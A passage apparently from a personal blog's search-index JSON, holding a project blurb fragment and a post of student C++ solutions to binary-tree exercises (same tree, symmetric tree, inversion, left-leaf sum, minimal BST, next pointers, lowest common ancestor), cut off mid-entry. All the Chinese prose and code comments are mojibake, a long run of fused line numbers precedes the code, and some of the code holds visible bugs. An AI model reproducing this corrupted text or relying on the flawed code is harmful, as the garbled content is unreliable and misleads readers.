·æœ¬é›†å¼ºåŒ–ç‰¹å¾å·¥ç¨‹ï¼Œæ„å»ºåŸºäºç›®çš„ã€æ—¶åŸŸç­‰å±æ€§çš„å¤šç»´ç‰¹å¾åº“ã€‚ 3. æ•°å­—èµ‹èƒ½åˆ‘äº‹å–è¯çªç ´ç½‘ç»œçŠ¯ç½ªï¼Œæ­å»ºè¾…åŠ©å–è¯å¹³å°ï¼ŒåæŸ¥å¹¶æä¾›è¯æ®çº¿ç´¢ã€‚","path":"Project/DaChuang/å¤§åˆ›ä»‹ç»/","date":"11-12","excerpt":"","tags":[{"name":"å¤§åˆ›","slug":"å¤§åˆ›","permalink":"http://example.com/tags/%E5%A4%A7%E5%88%9B/"}]},{"title":"äºŒå‰æ ‘é¢˜è§£","text":"# äºŒå‰æ ‘éƒ¨åˆ†é¢˜è§£ å¤§äºŒä¸Šå­¦æœŸï¼Œåšäº†ä¸€äº›æ ‘çš„é¢˜æ”¾ä¸€äº›ä¸ªäººçš„é¢˜è§£ï¼Œæ­£åœ¨ç†Ÿæ‚‰ C++, é—²æ¥æ— äº‹æ—¶å¯ä»¥ç¿»çœ‹ã€‚å˜¿å˜¿ è¡Œé«˜äº®123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739740741742743744745746747748749750751752753754755756757758759760761762763764765766767768769770771772773774775776777778779780781782783784785786787788789790791792793794795796797798799800801802803804805806807808809810811812813814815816817818819820821822823824825826827828829830831832833834835836837838839840841842843844845846847848849850851852853854855856857858859860861862863864865866867868869870871872873874875876877878879880881882883884885886887888889890891892893894895896897898899900901902903904905906907908909910911912913914915916917918919920921922923924925926927928929930931932933934935936937938939940941942943944945946947948949950951952953954955956957958959960961962963964965966967968969970971972973974975976977978979980981982983984985986987988989990991992993994995996997998999100010011002100310041005100610071008100910101011101210131014101510161017101810191020102110221023102410251026102710281029103010311032103310341035103610371038103910401041104210431044104510461047104810491050105110521053105410551056105710581059106010611062106310641065106610671068106910701071107210731074107510761077107810791080108110821083108410851086108710881089109010911092109310941095109610971098109911001101110211031104110511061107110811091110111111121113111411151116111711181119112011211122112311241125112611271128112911301131113211331134113511361137113811391140114111421143114411451146114711481149115011511152115311541155115611571158115911601161116211631164116511661167116811691170117111721173117411751176117711781179118011811182118311841185118611871188118911901191119211931194119511961197119811991200120112021203120412051206120712081209121012111212121312141215121612171218121912201221122212231224122512261227122812291230123112321233123412351236123712381239124012411242124312441245124612471248124912501251125212531254125512561257125812591260126112621263126412651266126712681269127012711272127312741275127612771278127912801281128212831284128512861287128812891290129112921293129412951296129712981299130013011302130313041305130613071308130913101311131213131314131513161317131813191320132113221323132413251326132713281329133013311332133313341335133613371338133913401341134213431344134513461347134813491350135113521353135413551356135713581359136013611362136313641365136613671368136913701371137213731374/******************************************************************************** 1.ç›¸åŒçš„æ ‘*/#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;queue&gt;#include &lt;sstream&gt;#include &lt;limits&gt;#include &lt;cmath&gt;using namespace std;//æ•°æ®ç»“æ„ä¸€ï¼šå¸¸è§„äºŒå‰æ ‘struct TreeNode1 &#123; int val; TreeNode1* left; TreeNode1* right; TreeNode1(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;&#125;;// å°†æ•°ç»„è½¬æ¢ä¸ºå±‚åºäºŒå‰æ ‘çš„å‡½æ•°TreeNode1* arrayToTree1(const vector&lt;string&gt;&amp; arr) &#123; if (arr.empty()) &#123; return nullptr; &#125; // æ„å»ºæ ¹èŠ‚ç‚¹ TreeNode1* root = new TreeNode1(stoi(arr[0])); queue&lt;TreeNode1*&gt; q; q.push(root); int i = 1; while (!q.empty() &amp;&amp; i &lt; arr.size()) &#123; TreeNode1* current = q.front(); q.pop();//stoiæ˜¯C++ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•´æ•°ã€‚å®ƒçš„å®Œæ•´åç§°æ˜¯std::stoiï¼Œå±äº&lt;string&gt;å¤´æ–‡ä»¶ä¸­çš„å‡½æ•°ã€‚ // æ„å»ºå·¦å­æ ‘èŠ‚ç‚¹ if (arr[i] != &quot;null&quot;) &#123; current-&gt;left = new TreeNode1(stoi(arr[i])); q.push(current-&gt;left); &#125; i++; // æ„å»ºå³å­æ ‘èŠ‚ç‚¹ if (i &lt; arr.size() &amp;&amp; arr[i] != &quot;null&quot;) &#123; current-&gt;right = new TreeNode1(stoi(arr[i])); q.push(current-&gt;right); &#125; i++; &#125; return root;&#125;// åˆ¤æ–­ä¸¤ä¸ªäºŒå‰æ ‘æ˜¯å¦ç›¸åŒçš„å‡½æ•°bool isSameTree1(TreeNode1* p, TreeNode1* q) &#123; if (p == nullptr &amp;&amp; q == nullptr) &#123; return true; &#125; if (p == nullptr || q == nullptr) &#123; return false; &#125; return (p-&gt;val == q-&gt;val) &amp;&amp; isSameTree1(p-&gt;left, q-&gt;left) &amp;&amp; isSameTree1(p-&gt;right, q-&gt;right);&#125;// é‡Šæ”¾äºŒå‰æ ‘å†…å­˜çš„å‡½æ•°void deleteTree1(TreeNode1* root) &#123; if (root == nullptr) &#123; return; &#125; deleteTree1(root-&gt;left); deleteTree1(root-&gt;right); delete root;&#125;int main_1() &#123; string arrayString1; getline(cin, arrayString1);//getlineå¯ä»¥è¯»å…¥ç©ºæ ¼ï¼Œä»¥æ¢è¡Œç»“æŸ/* // æ‰¾åˆ°ç¬¬ä¸€ä¸ªæ•°ç»„éƒ¨åˆ†çš„èµ·å§‹ä½ç½®å’Œç»“æŸä½ç½® size_t start1 = input.find(&#x27;[&#x27;); size_t end1 = input.find(&#x27;]&#x27;); // æå–ç¬¬ä¸€ä¸ªæ•°ç»„éƒ¨åˆ†çš„å­—ç¬¦ä¸² string arrayString1 = input.substr(start1 + 1, end1 - start1 - 1); // æ‰¾åˆ°ç¬¬äºŒä¸ªæ•°ç»„éƒ¨åˆ†çš„èµ·å§‹ä½ç½®å’Œç»“æŸä½ç½® size_t start2 = input.find(&#x27;[&#x27;, end1 + 1); size_t end2 = input.find(&#x27;]&#x27;, start2 + 1); // æå–ç¬¬äºŒä¸ªæ•°ç»„éƒ¨åˆ†çš„å­—ç¬¦ä¸² string arrayString2 = input.substr(start2 + 1, end2 - start2 - 1);*/ string arrayString2; getline(cin, arrayString2);//getlineå¯ä»¥è¯»å…¥ç©ºæ ¼ï¼Œä»¥æ¢è¡Œç»“æŸ // è§£æè¾“å…¥å­—ç¬¦ä¸²ä¸ºå­—ç¬¦ä¸²æ•°ç»„1 vector&lt;string&gt; arr1; stringstream ss1(arrayString1); string token1; while (getline(ss1, token1, &#x27;,&#x27;)) &#123; arr1.push_back(token1); &#125; // è§£æè¾“å…¥å­—ç¬¦ä¸²ä¸ºå­—ç¬¦ä¸²æ•°ç»„2 vector&lt;string&gt; arr2; stringstream ss2(arrayString2); string token2; while (getline(ss2, token2, &#x27;,&#x27;)) &#123; arr2.push_back(token2); &#125; if (arr1.size() != arr2.size()) &#123; cout &lt;&lt; &quot;false&quot; &lt;&lt; endl; &#125; else &#123; // æ„å»ºç¬¬ä¸€ä¸ªäºŒå‰æ ‘ TreeNode1* p = arrayToTree1(arr1); // æ„å»ºç¬¬äºŒä¸ªäºŒå‰æ ‘ TreeNode1* q = arrayToTree1(arr2); // åˆ¤æ–­ä¸¤ä¸ªäºŒå‰æ ‘æ˜¯å¦ç›¸åŒ bool result = isSameTree1(p, q); cout &lt;&lt; boolalpha &lt;&lt; result &lt;&lt; endl; // é‡Šæ”¾äºŒå‰æ ‘å†…å­˜ deleteTree1(p); deleteTree1(q); &#125; return 0;&#125;/*********************************************************************************2.äºŒå‰æ ‘çš„ä¸­åºéå†,åˆ¤æ–­å®ƒæ˜¯ä¸æ˜¯é•œé¢å¯¹ç§°*/// åˆ¤æ–­äºŒå‰æ ‘æ˜¯å¦å¯¹ç§°çš„è¾…åŠ©å‡½æ•°bool isSymmetricHelper2(TreeNode1* leftNode, TreeNode1* rightNode) &#123; // å·¦å­æ ‘å’Œå³å­æ ‘éƒ½ä¸ºç©ºï¼Œå¯¹ç§° if (leftNode == nullptr &amp;&amp; rightNode == nullptr) &#123; return true; &#125; // å·¦å­æ ‘æˆ–å³å­æ ‘æœ‰ä¸€ä¸ªä¸ºç©ºï¼Œä¸å¯¹ç§° if (leftNode == nullptr || rightNode == nullptr) &#123; return false; &#125; // åˆ¤æ–­å·¦å­æ ‘çš„å·¦å­æ ‘å’Œå³å­æ ‘çš„å³å­æ ‘æ˜¯å¦å¯¹ç§°ï¼Œä»¥åŠå·¦å­æ ‘çš„å³å­æ ‘å’Œå³å­æ ‘çš„å·¦å­æ ‘æ˜¯å¦å¯¹ç§° return (leftNode-&gt;val == rightNode-&gt;val) &amp;&amp; isSymmetricHelper2(leftNode-&gt;left, rightNode-&gt;right) &amp;&amp; isSymmetricHelper2(leftNode-&gt;right, rightNode-&gt;left);&#125;// åˆ¤æ–­äºŒå‰æ ‘æ˜¯å¦å¯¹ç§°bool isSymmetric2(TreeNode1* root) &#123; if (root == nullptr) &#123; return true; &#125; return isSymmetricHelper2(root-&gt;left, root-&gt;right);&#125;int main_2() &#123; string arrayString1; getline(cin, arrayString1);//getlineå¯ä»¥è¯»å…¥ç©ºæ ¼ï¼Œä»¥æ¢è¡Œç»“æŸ // è§£æè¾“å…¥å­—ç¬¦ä¸²ä¸ºå­—ç¬¦ä¸²æ•°ç»„1 vector&lt;string&gt; arr1; stringstream ss1(arrayString1); string token1; while (getline(ss1, token1, &#x27;,&#x27;)) &#123; arr1.push_back(token1); &#125; //æ„å»ºæ ‘ TreeNode1* p = arrayToTree1(arr1); if (isSymmetric2(p)) &#123; cout &lt;&lt; &quot;true&quot; &lt;&lt; endl; &#125; else cout &lt;&lt; &quot;false&quot; &lt;&lt; endl; return 0;&#125;/******************************************************************************3: ç¿»è½¬äºŒå‰æ ‘ç»™ä½ ä¸€æ£µäºŒå‰æ ‘çš„æ ¹èŠ‚ç‚¹ root ï¼Œç¿»è½¬è¿™æ£µäºŒå‰æ ‘ï¼Œå¹¶è¿”å›å…¶æ ¹èŠ‚ç‚¹ã€‚*/// äº¤æ¢äºŒå‰æ ‘çš„å·¦å³å­æ ‘void swapLeftAndRight3(TreeNode1* root) &#123; if (root == nullptr) &#123; return; &#125; // äº¤æ¢å·¦å³å­æ ‘ TreeNode1* temp = root-&gt;left; root-&gt;left = root-&gt;right; root-&gt;right = temp; // é€’å½’äº¤æ¢å·¦å³å­æ ‘ swapLeftAndRight3(root-&gt;left); swapLeftAndRight3(root-&gt;right);&#125;//ç°åœ¨å·²ç»çŸ¥é“num//ç®—å½“å‰å±‚æ•°int calculateHeight3(int num) &#123; int height = 0; while (pow(2, height) - 1 &lt; num) &#123; height++; &#125; return height;&#125;//æ»¡äºŒå‰æ ‘æœ€å¤šæœ‰å‡ ä¸ªèŠ‚ç‚¹int calculateNodeCount3(int height) &#123; return pow(2, height) - 1;&#125;// å±‚åºéå†äºŒå‰æ ‘void levelOrderTraversal3(TreeNode1* root,int num) &#123; if (root == nullptr) &#123; return; &#125; queue&lt;TreeNode1*&gt; q; q.push(root); int i = 0,null=0; while (!q.empty()) &#123; i++; TreeNode1* current = q.front(); q.pop(); if (current) &#123; cout &lt;&lt; current-&gt;val; if (current-&gt;left || current-&gt;right) &#123; if (current-&gt;left) &#123; q.push(current-&gt;left); &#125; else &#123; q.push(nullptr); null++; &#125; if (current-&gt;right) &#123; q.push(current-&gt;right); &#125; else &#123; q.push(nullptr); null++; &#125; &#125; else if (i &lt; num) &#123; q.push(nullptr); q.push(nullptr); null += 2; &#125; &#125; else &#123; null--; cout &lt;&lt; &quot;null&quot;; &#125; if (null == q.size()) break; if (!q.empty()) &#123; cout &lt;&lt; &quot;,&quot;; &#125; &#125;&#125;int main_3() &#123; string arrayString1; getline(cin, arrayString1);//getlineå¯ä»¥è¯»å…¥ç©ºæ ¼ï¼Œä»¥æ¢è¡Œç»“æŸ int num = 0; // è§£æè¾“å…¥å­—ç¬¦ä¸²ä¸ºå­—ç¬¦ä¸²æ•°ç»„1 vector&lt;string&gt; arr1; stringstream ss1(arrayString1); string token1; while (getline(ss1, token1, &#x27;,&#x27;)) &#123; arr1.push_back(token1); num++; &#125; int height = calculateHeight3(num); int num1 = calculateNodeCount3(height-1); //æ„å»ºæ ‘ TreeNode1* p = arrayToTree1(arr1); swapLeftAndRight3(p); levelOrderTraversal3(p,num1); return 0;&#125;//1,2,2,3,4,4,5,5,null,5,5,4,4,3,4,null,5,4/*4: å·¦å¶å­ä¹‹å’Œé¢˜ç›®æè¿°ç»™å®šäºŒå‰æ ‘çš„æ ¹èŠ‚ç‚¹ root ï¼Œè¿”å›æ‰€æœ‰å·¦å¶å­ä¹‹å’Œã€‚è¾“å…¥æè¿°ä¸€ä¸ªèŠ‚ç‚¹åºåˆ—è¾“å‡ºæè¿°è¿”å›å…¶å·¦å¶å­ä¹‹å’Œ*/// åŠ äºŒå‰æ ‘å·¦æ ‘å¶å­void Addleft4(TreeNode1* root) &#123; if (root == nullptr) &#123; cout &lt;&lt; &quot;0&quot; &lt;&lt; endl; return; &#125; if (!(root-&gt;left || root-&gt;right)) &#123; cout &lt;&lt; &quot;0&quot; &lt;&lt; endl; return; &#125; int num = 0; int flag = 0; queue&lt;TreeNode1*&gt; q; TreeNode1* a = new TreeNode1(-1); q.push(root); while (!q.empty()) &#123; TreeNode1* current = q.front(); q.pop(); if (current-&gt; val==- 1) &#123; flag = 1; //cout &lt;&lt; flag&lt;&lt;&quot; &quot;&lt;&lt;q.front()-&gt;val &lt;&lt; endl; continue; &#125; else if (current) &#123; if (current-&gt;left || current-&gt;right) &#123; if (current-&gt;left) &#123; q.push(a);//å·¦å­æ ‘å‰å…ˆåŠ ä¸ª-1è¿›å» q.push(current-&gt;left); &#125; if (current-&gt;right) &#123; q.push(current-&gt;right); &#125; flag = 0; &#125; else if (flag == 1 &amp;&amp; current &amp;&amp; !(current-&gt;left || current-&gt;right)) &#123; // cout &lt;&lt; current-&gt;val &lt;&lt; endl; num += current-&gt;val; //cout &lt;&lt; num &lt;&lt; endl; flag = 0; &#125; else; &#125; &#125; cout &lt;&lt; num &lt;&lt; endl;&#125;int main_4() &#123; string arrayString1; getline(cin, arrayString1);//getlineå¯ä»¥è¯»å…¥ç©ºæ ¼ï¼Œä»¥æ¢è¡Œç»“æŸ // è§£æè¾“å…¥å­—ç¬¦ä¸²ä¸ºå­—ç¬¦ä¸²æ•°ç»„1 vector&lt;string&gt; arr1; stringstream ss1(arrayString1); string token1; while (getline(ss1, token1, &#x27;,&#x27;)) &#123; arr1.push_back(token1); &#125; //æ„å»ºæ ‘ TreeNode1* p = arrayToTree1(arr1); Addleft4(p); return 0;&#125;/******************************************************************5.*æ„å»ºæœ€å°äºŒå‰æœç´¢æ ‘*/// é€’å½’æ„å»ºäºŒå‰æœç´¢æ ‘//åˆ†æ²»æ€æƒ³int BSTnum = 0;TreeNode1* buildBST5(vector&lt;string&gt; nums, int start, int end) &#123; if (start &gt; end) &#123; return NULL; &#125; else BSTnum++; int mid = 0; if (end - start % 2 == 0) &#123; mid = start + (end - start) / 2; &#125; else &#123; mid = start + (end - start+1)/ 2; &#125; //cout &lt;&lt; mid &lt;&lt; endl; TreeNode1* root = new TreeNode1(stoi(nums[mid])); root-&gt;left = buildBST5(nums, start, mid - 1); root-&gt;right = buildBST5(nums, mid + 1, end); return root;&#125;// åˆ›å»ºé«˜åº¦æœ€å°çš„äºŒå‰æœç´¢æ ‘TreeNode1* createMinimalBST(vector&lt;string&gt; nums) &#123; // cout &lt;&lt; nums.size() - 1 &lt;&lt; endl; return buildBST5(nums, 0, nums.size()-1);&#125;int main_5() &#123; string arrayString1; getline(cin, arrayString1);//getlineå¯ä»¥è¯»å…¥ç©ºæ ¼ï¼Œä»¥æ¢è¡Œç»“æŸ // è§£æè¾“å…¥å­—ç¬¦ä¸²ä¸ºå­—ç¬¦ä¸²æ•°ç»„1 vector&lt;string&gt; arr1; stringstream ss1(arrayString1); string token1; int num = 0; while (getline(ss1, token1, &#x27;,&#x27;)) &#123; arr1.push_back(token1); num++; &#125; //æ„å»ºæ ‘ TreeNode1* p = createMinimalBST(arr1); int height = calculateHeight3(BSTnum); int num1 = calculateNodeCount3(height - 1); levelOrderTraversal3(p,num1); return 0;&#125;/*ç¬¬6é¢˜ ç»™å®šå®Œç¾äºŒå‰æ ‘ï¼Œå¡«å……æ¯ä¸ªå³æŒ‡é’ˆstruct Node &#123;int val;Node *left;Node *right;Node *next;&#125;å¡«å……å®ƒçš„æ¯ä¸ª next æŒ‡é’ˆï¼Œè®©è¿™ä¸ªæŒ‡é’ˆæŒ‡å‘å…¶ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹ã€‚å¦‚æœæ‰¾ä¸åˆ°ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹ï¼Œåˆ™å°† next æŒ‡é’ˆè®¾ç½®ä¸º NULLã€‚åˆå§‹çŠ¶æ€ä¸‹ï¼Œæ‰€æœ‰ next æŒ‡é’ˆéƒ½è¢«è®¾ç½®ä¸º NULLã€‚è¾“å…¥æè¿°ç»™ä¸€ä¸ªå®Œç¾äºŒå‰æ ‘è¾“å‡ºæè¿°è¾“å‡ºå¡«å……å®ƒçš„æ¯ä¸ª next æŒ‡é’ˆï¼Œè®©è¿™ä¸ªæŒ‡é’ˆæŒ‡å‘å…¶ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹ã€‚å¦‚æœæ‰¾ä¸åˆ°ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹ï¼Œåˆ™å°† next æŒ‡é’ˆè®¾ç½®ä¸º NULLã€‚è¾“å…¥è¾“å‡ºæ ·ä¾‹è¾“å…¥root = [1,2,3,4,5,6,7]è¾“å‡º[1,#,2,3,#,4,5,6,7,#] è¾“å…¥root = []è¾“å‡º[]*///æœ‰nextçš„æ ‘èŠ‚ç‚¹struct TreeNextNode6 &#123; int val; TreeNextNode6* left; TreeNextNode6* right; TreeNextNode6* next; TreeNextNode6(int x) : val(x), left(nullptr), right(nullptr), next(nullptr)&#123;&#125;&#125;;int ErCiFang(int i) &#123; int n = 2; int num = 0; while(1) &#123; num += n; n *= 2; if (num == i) &#123; return 1; &#125; else if (num &gt; i) &#123; return 0; &#125; else continue; &#125;&#125;//æ„é€ æœ‰nextæŒ‡é’ˆçš„æ ‘//ä½†ç»™çš„æ•°ç»„é‡Œé¢æ²¡æœ‰nullï¼Œå› æ­¤ä¸èƒ½ç›´æ¥ç»™ç¬¬9é¢˜ç”¨TreeNextNode6* PerfectTree6(vector&lt;string&gt;&amp; Tree) &#123; if (Tree.empty()) &#123; return nullptr; &#125; TreeNextNode6 *root = new TreeNextNode6(stoi(Tree[0])); root-&gt;next = nullptr; queue&lt;TreeNextNode6*&gt; q; q.push(root); int i = 1; int ans = 0; while (1) &#123; TreeNextNode6* current = q.front(); // cout &lt;&lt; &quot;å­˜å…¥:&quot; &lt;&lt; current-&gt;val&lt;&lt;endl; q.pop(); ans++; //æ„å»ºnextæŒ‡é’ˆ if (!q.empty()) &#123; TreeNextNode6* next = q.front(); if (ErCiFang(ans-1)) &#123; current-&gt;next = nullptr; // cout &lt;&lt; &quot;äº§ç”Ÿä¸€ä¸ª#&quot; &lt;&lt; endl; &#125; else &#123; // cout&lt;&lt;current-&gt;val &lt;&lt; &quot;äº§ç”Ÿä¸€ä¸ªnextæ˜¯&quot;; current-&gt;next = next; // cout &lt;&lt; next-&gt;val &lt;&lt; endl; &#125; &#125; // æ„å»ºå·¦å­æ ‘èŠ‚ç‚¹ if (i &lt; Tree.size()) &#123; current-&gt;left = new TreeNextNode6(stoi(Tree[i])); q.push(current-&gt;left); //cout &lt;&lt; &quot; mama&quot; &lt;&lt; current-&gt;val &lt;&lt; &quot;mama &quot;; &#125; i++; // æ„å»ºå³å­æ ‘èŠ‚ç‚¹ if (i &lt; Tree.size())&#123; current-&gt;right = new TreeNextNode6(stoi(Tree[i])); q.push(current-&gt;right); &#125; i++; if (q.empty()) &#123; break; &#125; &#125; return root;&#125;// nextå±‚åºéå†äºŒå‰æ ‘void LevelTraversalPerfectTree6(TreeNextNode6* root) &#123;//å®Œç¾æ ‘ä¸å­˜åœ¨ç©ºæ ‘ if (root == nullptr) &#123; cout &lt;&lt; &#x27; &#x27; &lt;&lt; endl; return; &#125; queue&lt;TreeNextNode6*&gt; q; q.push(root); while (root-&gt;left) &#123;//å…ˆå­˜å…¥å…¨éƒ¨æœ€å·¦å…ƒç´  q.push(root-&gt;left); root = root-&gt;left; &#125; while (!q.empty()) &#123; TreeNextNode6* current = q.front(); q.pop(); while (current) &#123; cout &lt;&lt; current-&gt;val &lt;&lt; &quot;,&quot;; current = current-&gt;next; &#125; if (!q.empty()) &#123; cout &lt;&lt; &quot;#,&quot;; &#125; else cout &lt;&lt; &quot;#&quot; &lt;&lt; endl; &#125;&#125;int main_6() &#123; string arrayString1; getline(cin, arrayString1);//getlineå¯ä»¥è¯»å…¥ç©ºæ ¼ï¼Œä»¥æ¢è¡Œç»“æŸ // è§£æè¾“å…¥å­—ç¬¦ä¸²ä¸ºå­—ç¬¦ä¸²æ•°ç»„1 vector&lt;string&gt; arr1; stringstream ss1(arrayString1); string token1; while (getline(ss1, token1, &#x27;,&#x27;)) &#123; arr1.push_back(token1); &#125; //æ„å»ºå®Œç¾æ ‘ TreeNextNode6* p = PerfectTree6(arr1); // cout &lt;&lt; &quot;æ„å»ºæˆåŠŸ&quot; &lt;&lt; endl; LevelTraversalPerfectTree6(p); return 0;&#125;/*7: äºŒå‰æ ‘çš„æœ€è¿‘å…¬å…±ç¥–å…ˆé¢˜ç›®æè¿°ç»™å®šä¸€ä¸ªäºŒå‰æ ‘, æ‰¾åˆ°è¯¥æ ‘ä¸­ä¸¤ä¸ªæŒ‡å®šèŠ‚ç‚¹çš„æœ€è¿‘å…¬å…±ç¥–å…ˆã€‚ï¼ˆä¸€ä¸ªèŠ‚ç‚¹ä¹Ÿå¯ä»¥æ˜¯å®ƒè‡ªå·±çš„ç¥–å…ˆï¼‰ã€‚è¾“å…¥æè¿°ç»™ä¸€ä¸ªäºŒå‰æ ‘è¾“å‡ºæè¿°è¾“å‡ºå®ƒçš„æœ€è¿‘å…¬å…±è¿‘é‚»è¾“å…¥è¾“å‡ºæ ·ä¾‹è¾“å…¥root = [3,5,1,6,2,0,8,null,null,7,4], p = 5, q = 1è¾“å‡º3è¾“å…¥root = [1,2], p = 1, q = 2è¾“å‡º1*/struct ParentTreeNode7 &#123; int val; int ans; ParentTreeNode7* left; ParentTreeNode7* right; ParentTreeNode7* parent; ParentTreeNode7(int x, int y) : val(x), ans(y),left(nullptr), right(nullptr), parent(nullptr) &#123;&#125;&#125;;// å°†æ•°ç»„è½¬æ¢ä¸ºæœ‰çˆ¶æ¯çš„å±‚åºäºŒå‰æ ‘çš„å‡½æ•°ParentTreeNode7* ParentTree7(const vector&lt;string&gt;&amp; arr) &#123; if (arr.empty()) &#123; return nullptr; &#125; int ans = 1; // æ„å»ºæ ¹èŠ‚ç‚¹ ParentTreeNode7* root = new ParentTreeNode7(stoi(arr[0]),ans); root-&gt;parent = root; queue&lt;ParentTreeNode7*&gt; q; q.push(root); ans++; int i = 1; while (!q.empty() &amp;&amp; i &lt; arr.size()) &#123; ParentTreeNode7* current = q.front(); q.pop(); //stoiæ˜¯C++ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•´æ•°ã€‚å®ƒçš„å®Œæ•´åç§°æ˜¯std::stoiï¼Œå±äº&lt;string&gt;å¤´æ–‡ä»¶ä¸­çš„å‡½æ•°ã€‚ // æ„å»ºå·¦å­æ ‘èŠ‚ç‚¹ if (arr[i] != &quot;null&quot;) &#123; current-&gt;left = new ParentTreeNode7(stoi(arr[i]), ans); current-&gt;left-&gt;parent = current; q.push(current-&gt;left); ans++; &#125; //else ans++; i++; // æ„å»ºå³å­æ ‘èŠ‚ç‚¹ if (i &lt; arr.size() &amp;&amp; arr[i] != &quot;null&quot;) &#123; current-&gt;right = new ParentTreeNode7(stoi(arr[i]), ans); current-&gt;right-&gt;parent = current; q.push(current-&gt;right); ans++; &#125; //else ans++; i++; &#125; return root;&#125;//å±‚åºéå†åˆ°pç„¶åæŒ‡é’ˆåœåœ¨é‚£é‡ŒParentTreeNode7* Findpq7(ParentTreeNode7* root, int p) &#123; if (root == nullptr) &#123; return root; &#125; queue&lt;ParentTreeNode7*&gt; q; q.push(root); ParentTreeNode7* current = q.front(); while (!q.empty()) &#123; ParentTreeNode7* current = q.front(); q.pop(); if (current-&gt;ans == p) return current; if (current-&gt;left) &#123; q.push(current-&gt;left); &#125; if (current-&gt;right) &#123; q.push(current-&gt;right); &#125; &#125; return current;&#125;void FindSameParent7(ParentTreeNode7* root,int p,int q)&#123; //å±‚åºéå†åˆ°pç„¶åæŒ‡é’ˆåœåœ¨é‚£é‡Œ ParentTreeNode7* a = Findpq7(root, p); // cout &lt;&lt; &quot;aæŸ¥æ‰¾æˆåŠŸ:ansä¸º&quot; &lt;&lt;a-&gt;ans&lt;&lt; &quot;valä¸º&quot; &lt;&lt; a-&gt;val&lt;&lt; endl; ParentTreeNode7* b = Findpq7(root, q); // cout &lt;&lt; &quot;bæŸ¥æ‰¾æˆåŠŸ:ansä¸º&quot; &lt;&lt; b-&gt;ans&lt;&lt; &quot;valä¸º&quot; &lt;&lt; b-&gt;val&lt;&lt;endl; while (1) &#123; // cout &lt;&lt; &quot;********éå†æŸ¥æ‰¾*********&quot;&lt;&lt; endl; if (a-&gt;parent == b-&gt;parent) &#123;//å½“å‰å°±å·²ç»ç›¸åŒ cout &lt;&lt; a-&gt;parent-&gt;val &lt;&lt; endl; break; &#125; else if (a == b-&gt;parent) &#123; cout &lt;&lt; a-&gt;val &lt;&lt; endl; break; &#125; else if (a-&gt;parent == b) &#123; cout &lt;&lt; b-&gt;val &lt;&lt; endl; break; &#125; //else if (a-&gt;parent == root || b-&gt;parent == root) &#123;//éå†åˆ°åº• // cout &lt;&lt; &quot;è¾“å‡ºäº†rootå€¼&quot; &lt;&lt; endl; // cout &lt;&lt; root-&gt;val &lt;&lt; endl; // break; // &#125; else if (a-&gt;parent-&gt;ans &lt; b-&gt;parent-&gt;ans) &#123; // cout &lt;&lt; &quot;b+1æ­¤æ—¶açš„ansæ¯”bå°,aä¸º&quot; &lt;&lt; a-&gt;parent-&gt;ans &lt;&lt; &quot;,bä¸º&quot; &lt;&lt; b-&gt;parent-&gt;ans &lt;&lt; endl; b = b-&gt;parent; &#125; else if (a-&gt;parent-&gt;ans &gt; b-&gt;parent-&gt;ans) &#123; // cout &lt;&lt; &quot;a+1æ­¤æ—¶bçš„ansæ¯”aå°,aä¸º&quot; &lt;&lt; a-&gt;parent-&gt;ans &lt;&lt; &quot;,bä¸º&quot; &lt;&lt; b-&gt;parent-&gt;ans &lt;&lt; endl; a = a-&gt;parent; &#125; else continue; &#125;&#125;int main_7() &#123; string arrayString1; getline(cin, arrayString1);//getlineå¯ä»¥è¯»å…¥ç©ºæ ¼ï¼Œä»¥æ¢è¡Œç»“æŸ // è§£æè¾“å…¥å­—ç¬¦ä¸²ä¸ºå­—ç¬¦ä¸²æ•°ç»„1 vector&lt;string&gt; arr1; stringstream ss1(arrayString1); string token1; while (getline(ss1, token1, &#x27;,&#x27;)) &#123; arr1.push_back(token1); &#125; int p = 0, q = 0; cin &gt;&gt; p &gt;&gt; q; //æ„å»ºçˆ¶æ¯æ ‘ ParentTreeNode7* root = ParentTree7(arr1); // cout &lt;&lt; &quot;æ„å»ºæˆåŠŸ&quot; &lt;&lt; endl; FindSameParent7(root, p, q); return 0;&#125;/*ç¬¬å…«é¢˜ï¼Œç»™äº†äºŒå‰æœç´¢æ ‘* 8: æ¢å¤äºŒå‰æœç´¢æ ‘é¢˜ç›®æè¿°ç»™ä½ äºŒå‰æœç´¢æ ‘çš„æ ¹èŠ‚ç‚¹ root ï¼Œè¯¥æ ‘ä¸­çš„ æ°å¥½ 